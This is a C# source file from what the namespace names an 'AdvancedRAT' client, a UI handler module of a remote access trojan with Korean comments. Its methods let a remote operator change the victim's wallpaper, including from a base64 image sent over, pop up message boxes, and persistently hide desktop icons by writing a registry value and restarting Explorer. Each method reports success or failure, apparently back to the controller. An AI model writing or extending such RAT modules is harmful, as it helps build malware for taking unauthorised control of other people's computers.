using System;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Drawing;
using System.IO;

namespace AdvancedRAT.Client.Handlers
{
    public class UIHandler
    {
        [DllImport("user32.dll")]
        private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
        
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
        
        private const int SPI_SETDESKWALLPAPER = 20;
        private const int SPIF_UPDATEINIFILE = 0x01;
        private const int SPIF_SENDCHANGE = 0x02;
        
        // 배경화면 변경 (고유 기능)
        public async Task<object> ChangeWallpaper(string imagePath)
        {
            try
            {
                if (!File.Exists(imagePath))
                {
                    return new { success = false, message = "Image file not found" };
                }
                
                SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, imagePath, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
                return new { success = true, message = "Wallpaper changed" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        // Base64 이미지로 배경화면 변경
        public async Task<object> ChangeWallpaperFromBase64(string base64Image)
        {
            try
            {
                byte[] imageBytes = Convert.FromBase64String(base64Image);
                string tempPath = Path.Combine(Path.GetTempPath(), "wallpaper_temp.jpg");
                
                File.WriteAllBytes(tempPath, imageBytes);
                
                SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, tempPath, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
                return new { success = true, message = "Wallpaper changed from base64" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        // 메시지 박스 표시 (고유 기능)
        public async Task<object> ShowMessage(string title, string text, string icon = "Information")
        {
            try
            {
                MessageBoxIcon msgIcon = icon.ToLower() switch
                {
                    "error" => MessageBoxIcon.Error,
                    "warning" => MessageBoxIcon.Warning,
                    "question" => MessageBoxIcon.Question,
                    _ => MessageBoxIcon.Information
                };
                
                MessageBox.Show(text, title, MessageBoxButtons.OK, msgIcon);
                return new { success = true, message = "Message displayed" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        // 바탕화면 아이콘 숨기기/보이기 (고유 기능 - 영구적)
        public async Task<object> HideDesktopIcons()
        {
            try
            {
                IntPtr progman = FindWindow("Progman", null);
                IntPtr defView = FindWindow("SHELLDLL_DefView", null);
                IntPtr folderView = FindWindow("SysListView32", "FolderView");
                
                // 레지스트리로 영구 설정
                Microsoft.Win32.Registry.SetValue(
                    @"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced",
                    "HideIcons",
                    1,
                    Microsoft.Win32.RegistryValueKind.DWord
                );
                
                // 탐색기 재시작
                System.Diagnostics.Process.Start("explorer.exe");
                
                return new { success = true, message = "Desktop icons hidden" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> ShowDesktopIcons()
        {
            try
            {
                Microsoft.Win32.Registry.SetValue(
                    @"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced",
                    "HideIcons",
                    0,
                    Microsoft.Win32.RegistryValueKind.DWord
                );
                
                System.Diagnostics.Process.Start("explorer.exe");
                
                return new { success = true, message = "Desktop icons shown" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
    }
}
